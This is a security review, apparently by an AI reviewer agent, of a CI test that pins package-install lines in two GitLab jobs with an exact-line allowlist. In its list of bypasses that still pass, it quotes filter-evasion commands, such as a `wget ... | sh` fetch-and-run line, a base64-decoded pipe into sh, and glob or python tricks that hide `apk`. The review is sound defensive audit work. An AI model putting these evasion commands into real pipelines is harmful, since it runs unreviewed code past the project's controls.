# Security Review: T914 batch X round 3 (plan-203, SEC-T912-01 to -04 fix, exact-line allowlist)

Based on: docs/plans/plan-203-batch-x-apk-allowlist.md; docs/tasks/task-T915.md; docs/artifacts/security-review-t911-batch-x-v1.md (SEC-T912-01 to -04 and the orchestrator addendum); docs/plans/plan-201-batch-x-sec-t909.md (background only); diff of commit 77ed3468 against c5f5dbd5 (scratchpad t914.diff); worktree agent-devops-engineer-T914: tests/functional/test_ci_hash_pins.py (PINNED_JOBS lines 96-153, `pinned_job_problems`, `file_level_problems`, `ci_pin_problems`, `apk_allowlist_problems`, `ca_job_pairing_problems`, the mutation tests at 1672-1830) and .gitlab-ci.yml (ca-chain-check-python lines 169-190, main-develop-drift-gate lines 308-339).
Reviewer: security-engineer, read-only. Nothing was executed (no shell). "(reasoned, not run)" means read from the code. The orchestrator's run (tests.functional.test_ci_hash_pins 120 OK) and the engineer's report (11 weakenings each caught) were not re-run or verified by me. The clean-worktree suite and the pipeline are outside this review.
Scope: one file, tests/functional/test_ci_hash_pins.py. No job, digest, pin or image change (confirmed from the diff).

## Per-id status

| Id | Status | Basis |
|----|--------|-------|
| SEC-T912-01 (non-list field skipped) | Closed | `apk_allowlist_problems` refuses any of `before_script`, `script`, `after_script` that is not a list of strings (plain string, nested list, non-string item, `null`), for both jobs, with no silent skip. The exactly-once count is skipped only when that problem is already reported, so there is no double report and no gap. Mutations cover string, nested list, int item, `after_script: null` and `after_script: "apk add x"`. |
| SEC-T912-02 (stray apostrophe hides a redirect) | Closed | The decision is now equality with a pinned line, not a scan. `apk_trigger` only decides whether a line is judged. Its second form (quotes, backslashes and line breaks removed) can only add triggers, never remove one, so quoting cannot hide a line. `apk add x ' > /tmp/y` and `apk add x" '; id` are refused as lines that hold `apk` and are not on the list. A permitted line plus ` >/tmp/y` is refused. |
| SEC-T912-03 (`extends`/`default`, variable programs) | Partly closed | Closed: `extends` on either job is refused outright (not resolved; the choice is stated and tested). The top-level `default:` may not carry `before_script`, `script`, `after_script` or `hooks` or be a non-mapping (this is also already forced by `file_level_problems`, which requires `default` to hold exactly `image, interruptible, tags`, so it is defence in depth). Any `$`, backtick or `eval` at any position, in any of the three fields, in either job, is refused unless the line is pinned. `include:` is refused top-level by `REFUSED_TOP_LEVEL`, and `!reference` and merge keys end `ci_pin_problems` with a YAML error or a refusal. Residue (see SEC-T915-01 and -02): programs written without a trigger token in the python job, and job-level keys other than the three fields. For the drift gate the residue is closed by `PINNED_JOBS`. |
| SEC-T912-04 (over-refusal narrow, real file checked) | Closed | The judged set is only lines with `apk`, `$`, a backtick or `eval`. `test_the_real_ci_has_no_other_line_with_a_trigger_token_in_the_two_jobs` asserts, by sorted equality, that the real file's trigger lines are exactly: the python job's one apk line; the drift gate's apk line, `rm -rf "${CI_PROJECT_DIR}.tmp"` and the `--tag "${CI_COMMIT_TAG}"` tree line. I read the real file and agree (reasoned, not run): no other line of either job holds one of those tokens. The two `$` lines are legitimate and are pinned. |

## Answers to the review points

### 1. Closure
See the table. Three ids closed, SEC-T912-03 partly closed, with the residue graded LOW below.

### 2. Forms the allowlist still lets through
The key fact: `ca-chain-check-python` is NOT in `PINNED_JOBS` (that dict holds only the release gate, the drift gate and `release`). Plan-203 says lines without a trigger token are "not judged by this check (the other pins judge them)". That holds for the drift gate, whose `before_script` and `script` are compared for exact equality and whose key set is exact, so `after_script`, `hooks`, `extends` and any added line are refused there anyway. It does not hold for the python job: no other pin judges its lines or its keys. `runner_tag_problems`, `untagged_route_problems` and `tag_runnable_job_problems` judge only tags, `trigger`, `inherit` and `rules`.

Passes the allowlist in the python job, and no other pin catches it (reasoned, not run):
- A glob or bracket path to the binary, with no `apk` and no `$`: `/sbin/a?k add x`, `/sbin/a[p]k add x`, `/sbin/a*k add x`.
- A program in a non-trigger interpreter: `python3 -c "import os; os.system('ap'+'k add x')"` (quote removal gives `ap+k`, not `apk`), `python3 -c "import subprocess; subprocess.run(['/sbin/a'+'pk','add','x'])"`.
- Decoded or fetched payloads: `echo <base64 of "apk add x"> | base64 -d | sh`, `wget -qO- http://host/x | sh`, `sh some-other-committed-script.sh`, `find /sbin -name 'a?k' -exec {} add x \\;`.
- The permitted apk line moved to another position or field (it is counted across all three fields, not placed). The order matters, because the store is copied before the install; moved into `after_script`, or ahead of the copy, it still passes (SEC-T915-03).
- Job-level keys outside the three fields: `hooks: {pre_get_sources_script: [...]}` and `run:` (SEC-T915-02). Only `default:hooks` is refused.

Drift gate: everything above is caught by `PINNED_JOBS` (exact `before_script`/`script`, key set without `after_script`, `hooks`, `extends`), and also `ca_job_pairing_problems` is run beside it. The three permitted drift lines can appear in any of the three fields and any number of times inside this one function, but only the pin keeps them in place (SEC-T915-04).

Forms the allowlist does catch (reasoned, not run): split names (`ap""k`, `a\\pk`, `ap\\<newline>k`, `ev''al`), every `$` form (`$PM add x`, `${PM}`, `$(...)`), backticks, `eval`, `sh -c 'apk ...'`, chains and redirects with `apk` in them, a block-scalar item with a newline, and the permitted line with a trailing space or a redirect. `include:` and `!reference` end `ci_pin_problems` before this check. Both are covered by pins other than T914's.

### 3. Assertions
No assertion was weakened in effect. Details:
- Every old mutation subtest is still present (the diff only adds subtests). The old denylist function is gone, and each old case is now refused by equality.
- Replaced: `test_a_quoted_comparison_operator_is_a_plain_constraint` (it accepted `'git>=2.54'` and refused a mismatch) became `test_a_quoted_comparison_operator_in_the_pinned_line_is_refused` (refuses it even in both jobs). This reverses the SEC-T909-02 positive, deliberately and in the stricter direction. The mismatch half is still covered by the "git constraint", "extra package" and "reordered" subtests. The new assertion is a bare `assertNotEqual(..., [])`; it is not tied to the reason, as the other mutations are not.
- The old comparison of the two jobs' real `apk add` argument lists is replaced by a comparison of the two pinned constants plus "the real line equals the constant, exactly once" in each job. For the real file this is equivalent, and the existing test `..._share_the_image_and_the_openssl_constraint` asserts no problems on the real file.
- A message text changed; no test is said to depend on it (the suite is reported green).
- One mutation is weaker than its name: "drift gate permitted line moved to after_script" appends `DRIFT_GATE_REMOVE + " "` (trailing space), so it tests an altered line, not a verbatim move (SEC-T915-04).

## New findings

| Id | Severity | OWASP | Location | Finding | Remediation |
|----|----------|-------|----------|---------|-------------|
| SEC-T915-01 | SECURITY:LOW | A08 Data Integrity Failures | `apk_allowlist_problems`; `PINNED_JOBS` (no entry for ca-chain-check-python) | The allowlist judges only lines with `apk`, `$`, a backtick or `eval`. The python job's other lines are judged by no pin, so an install or command written without those tokens (globs such as `/sbin/a?k`, `python3 -c` programs, `base64 -d \\| sh`, `sh other.sh`) passes. The job is the reference the drift gate's CA lines are paired with, so an extra install there makes the check prove a different store or toolset. No current exposure: the real file has none of these, and the job runs only in branch and merge request pipelines. | Pin the python job's lines exactly, as the drift gate's are: a constant list `CA_PYTHON_BEFORE`/`CA_PYTHON_SCRIPT` and `self.assertEqual(job["before_script"], ...)`, in a separate pin (adding it to `PINNED_JOBS` would change the tag-job rules that loop uses). Then the trigger scan is a second line of defence. `assertEqual(ci["ca-chain-check-python"]["script"], PYTHON_SCRIPT)` |
| SEC-T915-02 | SECURITY:LOW | A08 | `apk_allowlist_problems`, `APK_FIELDS` | Only the three script fields and `extends` are read. A job-level `hooks:` (`pre_get_sources_script`), `run:` or any other key on ca-chain-check-python is not judged (the drift gate's key set is pinned, the python job's is not). Only `default:hooks` is refused. No current exposure. | Check the python job's key set exactly: `set(job) == {"stage","image","needs","before_script","script","rules"}`, and add a mutation with `hooks` on that job. |
| SEC-T915-03 | SECURITY:LOW | A08 | `apk_allowlist_problems`, line `flat.count(...)` | The python job's permitted apk line is counted across the three fields but not placed. Moved to `after_script`, or before the copy of the shipped store, it passes, although the check relies on the order (store copied before `apk add`). The drift gate's order is pinned; the python job's is not. Not a regression: the old code had the same gap. | Assert the apk line's index in `before_script` follows the cp line and the release floor and precedes the live-store checks (as the test at line 1678 does for the gate), or fold it into the exact list of SEC-T915-01. |
| SEC-T915-04 | SECURITY:LOW | A08 (test quality) | mutation "drift gate permitted line moved to after_script" | The case adds a trailing space, so it proves refusal of an altered line, not of a verbatim move or repeat. Inside this function a verbatim `DRIFT_GATE_REMOVE` or `DRIFT_GATE_TREE` in `after_script`, or twice, is accepted; only `PINNED_JOBS` refuses it. | Add verbatim move and duplicate cases for the pinned job and assert that the refusal comes from `pinned_job_problems`, or document that this function relies on the pin. |

## Verdict

## VERDICT: PASS

### Findings Summary
| Severity | Count | Resolved | Remaining |
|----------|-------|----------|-----------|
| CRITICAL | 0 | 0 | 0 |
| HIGH | 0 | 0 | 0 |
| MEDIUM | 0 | 0 | 0 |
| LOW | 4 new (SEC-T915-01 to -04); SEC-T912-01, -02, -04 closed, SEC-T912-03 partly closed (residue = SEC-T915-01, -02) | 3 (SEC-T912-01, -02, -04) | 4 new plus the residue of SEC-T912-03 (tracked as technical debt; the register counts the residue once, as in the precedents) |

### Justification
The exact-line allowlist ends the denylist cycle for what it judges: quoting, escapes, variables, backticks, `eval`, non-list fields and `extends` can no longer hide a line, and the real file's trigger lines are pinned by a test. No assertion is weakened in effect, no job, digest or pin changed, and the drift gate, which holds the real credential path, is double-covered by its exact pin. What remains is LOW and has no current exposure: the python job is a reference job in non-tag pipelines and is not exactly pinned, so lines without a trigger token and job-level keys other than the three fields are not judged. No Immutable Security Constraint is breached and no required control is weakened or removed.

### Conditions
None (PASS). The four LOW findings are tracked as technical debt under the user's LOW policy; SEC-T915-01 and -02 can be closed together by an exact pin of the python job's keys and lines.

### OWASP Coverage
| Category | Reviewed | Findings |
|----------|----------|----------|
| A01-A05, A07, A09, A10 | No (not in scope of this diff) | 0 |
| A06: Vulnerable Components | No | 0 |
| A08: Data Integrity Failures | Yes | 4 (LOW) |

## Limits
- Nothing was run: no suite, no mutation, no YAML load. Statements about what passes or is refused are from reading the code and the real `.gitlab-ci.yml` at the worktree. The 120 OK and the 11 weakenings were taken from the orchestrator and the engineer.
- Variables, `services:` and `image:` mappings in the python job were not analysed as injection routes beyond the image-equality check and the existing image pins.
- `scripts/check-ca-chains.sh` and the other scripts the jobs call are not covered by this check; their content is not in the diff.
- SEC-T756-02 and SEC-T881-02 are out of scope and unchanged. Pending outside this review: the clean-worktree full suite, the pipeline and the merge.

## Orchestrator addendum

- **Evidence re-run by the orchestrator:** `tests.functional.test_ci_hash_pins` 120 OK in the T914 worktree; the diff read found no weakened assertion (the quoted `'git>=2.54'` test was replaced by one asserting refusal inside the pinned line). The clean-worktree suite and pipeline are recorded in the merge request.
- **SEC-T915-01 and -02** are the residue of SEC-T912-03 and are one fix (an exact pin of the python job's keys and lines); the register counts the residue once.
